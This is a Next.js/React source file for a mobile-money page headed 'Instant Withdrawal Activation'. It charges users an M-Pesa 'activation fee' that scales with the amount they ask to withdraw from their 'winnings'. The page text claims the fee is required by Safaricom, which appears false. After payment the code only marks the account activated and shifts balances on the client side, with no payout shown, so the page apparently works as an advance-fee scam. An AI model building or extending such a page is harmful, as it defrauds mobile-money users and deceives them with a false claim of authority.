"use client";
import React, { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import styled from "styled-components";
import { useUser } from "@/hooks/useUser";
import { PageWrapper, BackHeader } from "@/components/SharedStyles";
import { mpesaApi } from "@/services/mpesaService";

const ContentContainer = styled.div`
  width: 100%;
  max-width: 500px;
  margin-top: 20px;
`;

const MainCard = styled.div`
  background: #002d58;
  border: 4px solid #fbdf07;
  border-radius: 40px;
  padding: 45px;
  position: relative;
  overflow: hidden;
  box-shadow: 0 25px 60px rgba(0, 0, 0, 0.5);

  &::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 4px;
    background: linear-gradient(90deg, #005baa, #fbdf07, #005baa);
  }
`;

const Title = styled.h1`
  font-size: 2rem;
  font-weight: 950;
  margin-bottom: 12px;
  color: #ffffff;
  letter-spacing: -1px;
  text-transform: uppercase;
`;

const Subtitle = styled.p`
  font-size: 1rem;
  color: #94a3b8;
  margin-bottom: 35px;
  line-height: 1.6;
  font-weight: 600;
`;

const ActivateButton = styled.button`
  width: 100%;
  background: #fbdf07;
  color: #000;
  border: none;
  border-radius: 20px;
  padding: 22px;
  font-weight: 950;
  font-size: 1.1rem;
  cursor: pointer;
  transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
  text-transform: uppercase;
  letter-spacing: 2px;
  box-shadow: 0 15px 35px rgba(251, 223, 7, 0.2);

  &:hover:not(:disabled) {
    transform: translateY(-5px);
    box-shadow: 0 20px 45px rgba(59, 130, 246, 0.35);
  }

  &:disabled {
    opacity: 0.5;
    cursor: not-allowed;
  }
`;

export default function ActivateAccount() {
  const router = useRouter();
  const { user, updateUser } = useUser();
  const [withdrawInput, setWithdrawInput] = useState<string>("");
  const [isProcessing, setIsProcessing] = useState(false);
  const [step, setStep] = useState<"initial" | "processing" | "waiting" | "success">("initial");
  const [timer, setTimer] = useState(25);

  // Calculate fee based on withdrawal amount
  const calculateFee = (amount: number) => {
    if (!amount || amount <= 0) return 0;
    if (amount < 100) return 100; 
    if (amount <= 1000) return 100;
    if (amount <= 5000) return 200;
    if (amount <= 10000) return 350;
    if (amount <= 15000) return 500;
    if (amount <= 20000) return 600;
    return 700; // 20k plus
  };

  const currentAmount = Number(withdrawInput) || 0;
  const activationFee = calculateFee(currentAmount);

  useEffect(() => {
    if (!user) {
      router.push('/login');
      return;
    }
    // Amount field starts empty per user request
    setWithdrawInput("");
  }, [user, router]);

  const handlePay = async () => {
    setIsProcessing(true);
    setStep("processing");

    try {
      const data = await mpesaApi.initiateStkPush(
        user?.phoneNumber || user?.phone || "",
        activationFee,
        "LIQUIDITY_UNLOCK"
      );

      if (data.ResponseCode === "0") {
        setStep("waiting");
        
        // Start polling for real status from the store
        const checkoutID = data.CheckoutRequestID;
        let pollCount = 0;
        const maxPolls = 60; // 60 seconds max

        const pollTimer = setInterval(async () => {
          pollCount++;
          if (pollCount > maxPolls) {
            clearInterval(pollTimer);
            alert("Verification Timeout. If transaction was successful, funds will sync automatically.");
            setStep("initial");
            setIsProcessing(false);
            return;
          }

          try {
            const statusData = await mpesaApi.checkStkStatus(checkoutID);

            if (statusData.status === "SUCCESS") {
              clearInterval(pollTimer);
              handleSuccess();
            } else if (statusData.status === "FAILED") {
              clearInterval(pollTimer);
              alert(`Payment Failed: ${statusData.resultDesc}`);
              setStep("initial");
              setIsProcessing(false);
            }
          } catch (pollErr) {
            console.error("Status check failed", pollErr);
          }
        }, 1500);

        // Keep the visual countdown timer as well for the UI
        const countdown = setInterval(() => {
          setTimer(prev => {
            if (prev <= 1) {
              clearInterval(countdown);
              return 0;
            }
            return prev - 1;
          });
        }, 1000);

      } else {
        alert("Gateway Rejected: " + (data.errorMessage || data.error));
        setStep("initial");
        setIsProcessing(false);
      }
    } catch (err) {
      alert("Handshake Failed. Check Connection.");
      setStep("initial");
      setIsProcessing(false);
    }
  };

  const handleSuccess = () => {
    setStep("success");
    
    // Split logic: Set withdrawableBalance to the amount they chose to withdraw
    // Decrement the global balance by that amount
    const withdrawalAmount = Number(withdrawInput) || 0;
    const currentBalance = Number(user?.balance) || 0;
    const currentWithdrawable = Number(user?.withdrawableBalance) || 0;
    const newBalance = Math.max(0, currentBalance - withdrawalAmount);

    updateUser({ 
      isActivated: true,
      withdrawableBalance: currentWithdrawable + withdrawalAmount,
      balance: newBalance
    });

    localStorage.setItem("isActivated", "true");
    setTimeout(() => {
      router.push("/home");
    }, 2500);
  };

  if (!user) return null;

  return (
    <PageWrapper>
      <BackHeader title="Account Trust" onBack={() => router.push('/home')} />

      <ContentContainer>
        <MainCard>
          {step !== "success" ? (
            <>
              <Title>Instant Withdrawal Activation</Title>
              <Subtitle>
                Secure your withdrawal channel by authorizing a one-time activation. This verification is required by Safaricom for instant payouts.
              </Subtitle>

              <div style={{ background: 'rgba(255, 255, 255, 0.05)', padding: '24px', borderRadius: '16px', border: '1px solid rgba(255,255,255,0.1)', marginBottom: '30px' }}>
                <div style={{ marginBottom: '20px', padding: '12px', borderLeft: '3px solid #3b82f6', background: 'rgba(59, 130, 246, 0.05)', fontSize: '0.8rem', color: 'rgba(255,255,255,0.7)', lineHeight: '1.4' }}>
                  💡 <b>PROCEED:</b> Enter the amount you wish to withdraw first. The system will calculate your one-time activation fee.
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px', marginBottom: '15px' }}>
                  <label style={{ color: '#94a3b8', fontSize: '0.85rem', fontWeight: 600 }}>Amount to Withdraw (Min 100):</label>
                  <input 
                    type="number" 
                    value={withdrawInput}
                    onChange={(e) => setWithdrawInput(e.target.value)}
                    style={{
                      background: 'rgba(0,0,0,0.3)',
                      border: '1px solid rgba(59, 130, 246, 0.3)',
                      borderRadius: '8px',
                      padding: '12px',
                      color: '#ffffff',
                      fontSize: '1.1rem',
                      fontWeight: '800',
                      outline: 'none'
                    }}
                    placeholder="Enter amount..."
                  />
                  <span style={{ fontSize: '0.65rem', color: '#3b82f6', fontWeight: 700 }}>Total Wallet: KES {Number(user.balance).toLocaleString()}</span>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '15px' }}>
                  <span style={{ color: '#94a3b8', fontSize: '0.85rem', fontWeight: 600 }}>Activation Fee:</span>
                  <span style={{ fontWeight: 950, color: '#ffffff' }}>KES {activationFee.toLocaleString()}.00</span>
                </div>
              </div>

              {step === "initial" && (
                <ActivateButton 
                  onClick={handlePay} 
                  disabled={isProcessing || withdrawInput === "" || currentAmount < 100 || currentAmount > Number(user.balance)}
                >
                  {withdrawInput === "" ? "ENTER WITHDRAWAL AMOUNT" :
                   currentAmount < 100 ? "MIN WITHDRAWAL KES 100" : 
                   currentAmount > Number(user.balance) ? "LIMIT EXCEEDED" : 
                   `Authorize Activation (${activationFee} KES)`}
                </ActivateButton>
              )}

              {(step === "processing" || step === "waiting") && (
                <div style={{ textAlign: 'center', padding: '20px' }}>
                  <div style={{ fontSize: '1.2rem', fontWeight: 950, marginBottom: '10px', color: '#ffffff' }}>
                    {step === "processing" ? "CONNECTING..." : "CHECK YOUR PHONE"}
                  </div>
                  <div style={{ fontSize: '0.9rem', color: '#94a3b8', marginBottom: '20px', fontWeight: 600 }}>
                    {step === "processing" ? "Securing handshake with Safaricom..." : "Enter M-PESA PIN to complete activation."}
                  </div>
                  <div style={{ fontSize: '2.5rem', fontWeight: 950, color: '#3b82f6' }}>{timer}s</div>
                </div>
              )}
            </>
          ) : (
            <div style={{ textAlign: 'center', padding: '40px 0' }}>
               <div style={{ fontSize: '3.5rem', marginBottom: '24px' }}>✅</div>
               <Title style={{ color: '#22c55e' }}>Account Activated</Title>
               <Subtitle>Your withdrawal channel is now fully operational. You can now withdraw your winnings instantly.</Subtitle>
               <div style={{ fontSize: '0.9rem', color: '#22c55e', fontWeight: 900, textTransform: 'uppercase', letterSpacing: '1px' }}>REDIRECTING TO DASHBOARD...</div>
            </div>
          )}
        </MainCard>
      </ContentContainer>
    </PageWrapper>
  );
}

